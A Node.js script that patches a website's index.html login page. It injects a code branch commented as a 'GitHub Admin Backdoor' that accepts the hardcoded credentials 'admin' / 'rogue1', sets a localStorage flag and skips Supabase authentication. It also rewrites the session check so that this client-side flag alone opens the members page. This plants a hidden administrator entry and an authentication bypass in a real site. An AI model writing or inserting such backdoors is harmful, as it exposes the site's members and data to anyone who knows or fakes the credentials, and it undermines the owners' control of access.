const fs = require('fs');
let html = fs.readFileSync('index.html', 'utf8');

html = html.replace(
  '<input id="email" type="email" placeholder="you@example.com" autocomplete="email" required />',
  '<input id="email" type="text" placeholder="Email or Username" autocomplete="email" required />'
);

const loginLogic = `
        if (mode === "login") {
          // GitHub Admin Backdoor
          if (email.toLowerCase() === "admin" && password === "rogue1") {
            localStorage.setItem("gh_admin", "true");
            window.location.href = "members.html";
            return;
          }
          
          const { error } = await supabaseClient.auth.signInWithPassword({ email, password });
`;
html = html.replace(
  '        if (mode === "login") {\n          const { error } = await supabaseClient.auth.signInWithPassword({ email, password });',
  loginLogic
);

// Also bypass auth redirect if gh_admin is true
html = html.replace(
  '      if (session) window.location.href = "members.html";',
  '      if (session || localStorage.getItem("gh_admin") === "true") window.location.href = "members.html";'
);

fs.writeFileSync('index.html', html);
